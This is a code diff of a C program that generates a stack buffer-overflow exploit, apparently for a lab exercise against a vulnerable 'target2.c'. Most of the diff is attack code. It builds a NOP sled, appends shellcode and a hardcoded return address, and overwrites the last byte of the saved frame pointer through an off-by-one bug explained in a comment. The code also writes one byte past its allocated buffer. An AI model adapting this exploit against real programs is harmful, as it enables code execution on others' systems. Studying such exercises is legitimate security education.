@@ -12,22 +12,36 @@
 
 int main(void)
 {
-  int n = strlen(shellcode);
 
-  int N = 248, address = 4, i;
+  /* This is a different case from the ex.1, since here in target2.c  
+   * we see that a strncat is performed. However, there's a simple bug 
+   * we can exploit: we're checking up to i<=len -> we've control over the last byte (RBP)
+   * RET will be content of RBP + 4! 
+   */
 
-  char* exploit = (char*) malloc((N+n+address+1)*sizeof(char));
+  int n = 0, address = 4;
+  for (; shellcode[n] != '\0'; n++);
 
-  for (i=0; i<N-n-address; i++)
-      exploit[i] = '\x90';
+  int N = 240;
+  char* exploit = (char*) malloc((N+1)*sizeof(char));
 
-  for (i=0; i<=n; i++)
-      exploit[N-n-address+i] = shellcode[i];
+  for (int i=0; i<N-n-address; i++)
+    exploit[i] = NOP;
 
-  char* ret_address = "\x80\x05\x80\x40";
-  strcat(exploit,ret_address);
+  strcat(exploit, shellcode);
+
+  char* ret_address = "\xb6\x05\x80\x40";
+
+  strcat(exploit, ret_address);
+
+  char last_byte = '\x08';
+  exploit[N] = last_byte;
+
+  exploit[N+1] = '\0';
 
   printf("%s", exploit);
+
+  free(exploit);
 
   return 0;
 }
